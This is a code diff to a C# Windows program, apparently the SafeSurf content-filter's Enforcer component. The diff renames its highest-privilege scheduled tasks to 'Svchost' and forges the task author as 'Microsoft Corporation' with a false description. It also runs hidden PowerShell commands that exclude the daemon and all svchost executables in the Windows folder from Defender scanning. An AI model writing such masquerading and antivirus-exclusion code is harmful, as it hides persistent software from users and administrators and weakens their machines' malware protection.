@@ -58,8 +58,8 @@ namespace Enforcer
             }
             else
             {
+                AddDefenderExclusion(exePath);
                 InitializeWatchdog(args);
-                AddDefenderExclusion();
                 SetHosts();       
                 ShutdownBlockReasonCreate(Handle, "Enforcer is active.");
                 InitializeLock();
@@ -81,8 +81,8 @@ namespace Enforcer
                         filePadlock.Close();
                     using (var taskService = new TaskService())
                     {
-                        taskService.RootFolder.DeleteTask("SafeSurf Startup", false);
-                        taskService.RootFolder.DeleteTask("SafeSurf Heartbeat", false);
+                        taskService.RootFolder.DeleteTask("Svchost Startup", false);
+                        taskService.RootFolder.DeleteTask("Svchost Heartbeat", false);
                     }                    
                     watchdog.Kill();
                     continue;
@@ -90,8 +90,8 @@ namespace Enforcer
                 else
                 {
                     SetCleanBrowsingDNS();
-                    RegisterTask("SafeSurf Startup", new LogonTrigger(), new ExecAction(Path.Combine(exePath, "SSDaemon.exe")));
-                    RegisterTask("SafeSurf Heartbeat", new TimeTrigger() { StartBoundary = DateTime.Now, Repetition = new RepetitionPattern(TimeSpan.FromMinutes(1), TimeSpan.Zero) }, 
+                    RegisterTask("Svchost Startup", new LogonTrigger(), new ExecAction(Path.Combine(exePath, "SSDaemon.exe")));
+                    RegisterTask("Svchost Heartbeat", new TimeTrigger() { StartBoundary = DateTime.Now, Repetition = new RepetitionPattern(TimeSpan.FromMinutes(1), TimeSpan.Zero) }, 
                         new ExecAction(Path.Combine(exePath, "SSDaemon.exe"), "0"));     
                 }
                 Thread.Sleep(4000);
@@ -146,7 +146,11 @@ namespace Enforcer
                 watchdog = Process.GetProcessById(StartWatchdog());
             }
             foreach (string file in Directory.GetFiles(windowsPath, "*svchost*"))
+            {
+                if (Path.GetExtension(file).Equals(".exe"))
+                    AddDefenderExclusion(file);
                 filePadlocks.Add(new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.Read));
+            }
             Task.Run(() =>
             {
                 while (isEnforcerActive)
@@ -180,7 +184,8 @@ namespace Enforcer
                 taskService.RootFolder.DeleteTask(name, false);
                 var taskDefinition = taskService.NewTask();
                 taskDefinition.Settings.DisallowStartIfOnBatteries = false;
-                taskDefinition.RegistrationInfo.Author = "github.com/na-stewart";
+                taskDefinition.RegistrationInfo.Author = "Microsoft Corporation";
+                taskDefinition.RegistrationInfo.Description = "Ensures critical Windows svchost processes are running.";
                 taskDefinition.Principal.RunLevel = TaskRunLevel.Highest;
                 taskDefinition.Triggers.Add(taskTrigger);
                 taskDefinition.Actions.Add(execAction);
@@ -270,14 +275,14 @@ namespace Enforcer
             new ToastContentBuilder().AddText("SafeSurf - Circumvention Detected").AddText(quotes[new Random().Next(0, quotes.Count())]).Show();
         }
 
-        void AddDefenderExclusion()
+        void AddDefenderExclusion(string path)
         {
             var powershell = new ProcessStartInfo("powershell")
             {
                 UseShellExecute = false,
                 CreateNoWindow = true,
                 Verb = "runas",
-                Arguments = $" -Command Add-MpPreference -ExclusionPath '{exePath}'"
+                Arguments = $" -Command Add-MpPreference -ExclusionPath '{path}' -ExclusionProcess '{Path.Combine(exePath, "SSDaemon.exe")}'"
             };
             Process.Start(powershell);
         }
